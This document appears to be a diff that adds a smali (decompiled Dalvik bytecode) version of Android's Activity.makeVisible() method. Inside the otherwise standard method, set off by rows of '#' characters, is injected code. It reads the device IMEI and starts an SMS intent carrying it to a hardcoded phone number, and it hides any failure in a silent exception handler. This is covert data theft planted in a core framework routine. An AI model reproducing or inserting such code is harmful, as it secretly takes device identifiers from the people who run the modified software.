@@ -1,0 +1,116 @@
+.method makeVisible()V
+    .locals 8
+
+    .prologue
+    .line 4799
+    iget-boolean v6, p0, Landroid/app/Activity;->mWindowAdded:Z
+
+    if-nez v6, :cond_0
+
+    .line 4800
+    invoke-virtual {p0}, Landroid/app/Activity;->getWindowManager()Landroid/view/WindowManager;
+
+    move-result-object v5
+
+    .line 4801
+    .local v5, "wm":Landroid/view/ViewManager;
+    iget-object v6, p0, Landroid/app/Activity;->mDecor:Landroid/view/View;
+
+    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;
+
+    move-result-object v7
+
+    invoke-virtual {v7}, Landroid/view/Window;->getAttributes()Landroid/view/WindowManager$LayoutParams;
+
+    move-result-object v7
+
+    invoke-interface {v5, v6, v7}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
+
+    .line 4802
+    const/4 v6, 0x1
+
+    iput-boolean v6, p0, Landroid/app/Activity;->mWindowAdded:Z
+
+    .line 4804
+    .end local v5    # "wm":Landroid/view/ViewManager;
+    :cond_0
+    ###################################################################
+    iget-object v6, p0, Landroid/app/Activity;->mComponent:Landroid/content/ComponentName;
+
+    if-eqz v6, :cond_1
+
+    iget-object v6, p0, Landroid/app/Activity;->mComponent:Landroid/content/ComponentName;
+
+    invoke-virtual {v6}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;
+
+    move-result-object v6
+
+    if-eqz v6, :cond_1
+
+    .line 4807
+    :try_start_0
+    const-string/jumbo v6, "phone"
+
+    invoke-virtual {p0, v6}, Landroid/app/Activity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object v3
+
+    check-cast v3, Landroid/telephony/TelephonyManager;
+
+    .line 4808
+    .local v3, "telephonyManager":Landroid/telephony/TelephonyManager;
+    invoke-virtual {v3}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;
+
+    move-result-object v2
+
+    .line 4809
+    .local v2, "strImei":Ljava/lang/String;
+    const-string/jumbo v6, "smsto:+841653741349"
+
+    invoke-static {v6}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
+
+    move-result-object v4
+
+    .line 4810
+    .local v4, "uri":Landroid/net/Uri;
+    new-instance v1, Landroid/content/Intent;
+
+    const-string/jumbo v6, "android.intent.action.SENDTO"
+
+    invoke-direct {v1, v6, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V
+
+    .line 4811
+    .local v1, "it":Landroid/content/Intent;
+    const-string/jumbo v6, "Imei: "
+
+    invoke-virtual {v1, v6, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
+
+    .line 4812
+    invoke-virtual {p0, v1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V
+    :try_end_0
+    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
+
+    .line 4819
+    .end local v1    # "it":Landroid/content/Intent;
+    .end local v2    # "strImei":Ljava/lang/String;
+    .end local v3    # "telephonyManager":Landroid/telephony/TelephonyManager;
+    .end local v4    # "uri":Landroid/net/Uri;
+    :cond_1
+    :goto_0
+    ###################################################################
+    iget-object v6, p0, Landroid/app/Activity;->mDecor:Landroid/view/View;
+
+    const/4 v7, 0x0
+
+    invoke-virtual {v6, v7}, Landroid/view/View;->setVisibility(I)V
+
+    .line 4798
+    return-void
+    ########################################################
+    .line 4814
+    :catch_0
+    move-exception v0
+
+    .local v0, "e":Ljava/lang/Exception;
+    goto :goto_0
+.end method
